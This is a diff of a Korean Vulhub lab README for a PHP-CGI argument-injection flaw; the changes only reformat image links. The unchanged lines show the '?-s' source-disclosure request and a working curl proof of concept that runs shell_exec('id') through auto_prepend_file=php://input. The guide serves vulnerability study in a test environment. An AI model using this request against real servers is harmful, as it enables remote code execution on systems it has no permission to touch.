@@ -24,7 +24,7 @@ contributors
 - `docker compose up -d - -build` 를 실행하여 테스트 환경 실행함
 - `http://your-ip:8080/`에 접속하여 기본 페이지를 확인합니다.
 - 정상적으로 테스트 환경이 구축됐다면, 아래 사진과 같이 페이지에 `Hello, Your name is Vulhub`
-- ![](1.png)
+  ![](1.png)
 
 ## 취약 조건
 
@@ -38,7 +38,7 @@ contributors
     - `-c` : 사용할 php.ini 설정 파일의 경로를 지정하는 옵션
     - `-n` : php.ini 설정 파일을 사용하지 않고 PHP를 실행하는 옵션
 - `http://your-ip:8080/index.php?-s`에 엑세스 하면 웹페이지의 소스코드가 노출됩니다.
-- ![](2.png)
+  ![](2.png)
 
 ## 재현 절차
 
@@ -54,7 +54,7 @@ contributors
 - Request Body : <?php echo shell_exec("id"); ?>
 - allow_url_include 옵션을 활성화하고 auto_prepend_file을 php://input으로 설정하면, 요청 Body의 PHP 코드가 먼저 포함되어 실행된다.
 - `curl -i -X POST "http://localhost:8080/index.php?-d+allow_url_include%3D1+-d+auto_prepend_file%3Dphp://input" --data "<?php echo shell_exec('id'); ?>"`
-- ![](3.png)
+  ![](3.png)
 
 ## 실행 결과
 
